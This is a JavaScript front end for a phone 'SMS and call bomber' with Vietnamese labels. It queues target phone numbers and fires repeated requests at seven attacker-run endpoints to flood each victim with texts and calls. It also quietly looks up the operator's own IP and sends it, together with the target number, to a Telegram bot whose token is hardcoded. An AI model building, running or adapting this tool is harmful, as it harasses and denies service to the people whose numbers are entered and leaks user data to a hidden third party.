let queue = [];
let processing = false;

// Bản quyền của quang
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index1.php?',
    'https://quang.nqtool.net/index2.php?',
    'https://quang.nqtool.net/index3.php?',
    'https://quang.nqtool.net/index4.php?',
    'https://quang.nqtool.net/index5.php?',
    'https://quang.nqtool.net/index6.php?'
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    // check ip
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            
            // Send "Đang xử lý" notification
            sendNotification(ip, phone, times, 'Đang xử lý', '');

            spamSmsAndCall(phone, times, ip, listItem);
        })
        .catch(error => {
            console.error('Error IP:', error);
            spamSmsAndCall(phone, times, 'Ip không xác định', listItem); // ip thất bại 
        });
}

function spamSmsAndCall(phone, times, ip, listItem) {
    // Create URLs for API requests
    const urlsToFetch = urls.map(url => `${url}phone=${phone}&amout=${times}`);

    Promise.all(urlsToFetch.map((url, index) => 
        fetch(url)
            .then(response => response.text()) // Change to text() to handle plain text responses
            .then(responseText => {
                // Extract endpoint (e.g., 'index1.php')
                const endpoint = new URL(url).pathname.split('/').pop();
                // Check "sent"
                const isSuccess = responseText.includes('sent');

                return { endpoint, isSuccess, message: `Api ${index + 1} - ${isSuccess ? 'Thành công' : 'Thất bại'}` };
            })
            .catch(error => {
                console.error('Error:', error);
                return { endpoint: 'không xác định', isSuccess: false, message: `Api ${index + 1} - Thất bại` };
            })
    ))
    .then(results => {
        const messages = results.map(result => result.message).join(', ');
        const endpoint = results[0]?.endpoint || 'unknown';
        
        // Update status list item
        listItem.innerText = `Thành Công ${phone}`;
        
        // Send "Xử lý thành công" notification
        sendNotification(ip, phone, times, 'Xử lý thành công', messages);

        processQueue();
    })
    .catch(error => {
        listItem.innerText = `Thất bại ${phone}`;
        // Send "Xử lý thất bại"
        sendNotification(ip, phone, times, 'Xử lý thất bại', '');
        processQueue();
    });
}

function sendNotification(ip, phone, times, status, details) {
    const botToken = '7100464361:AAH-k_BdCz3hSrewu_hAX9nSNnZUGFsxfCo';  // Replace with your bot's token
    const chatId = '-1002136414572';  // Replace with your chat ID or group's chat ID

    // Construct the message based on the status
    let message;
    if (status === 'Đang xử lý') {
        message = `Trạng thái: ${status}\n- IP: ${ip}\n- Phone: ${phone}\n- Times: ${times}\n- Note: ${messages}`;
    } else if (status === 'Xử lý thành công') {
        message = `Trạng thái: ${status}\n- IP: ${ip}\n- Phone: ${phone}\n- Times: ${times}\n- Chi tiết: ${details}\n- Note: ${messages}`;
    } else if (status === 'Xử lý thất bại') {
        message = `Trạng thái: ${status}\n- IP: ${ip}\n- Phone: ${phone}\n- Times: ${times}\n - Note: ${messages}`;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // Send notification
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log(`Thông báo thành công`);
            } else {
                console.error('Failed', data);
            }
        })
        .catch(error => {
            console.error('Error', error);
        });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear luồng
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
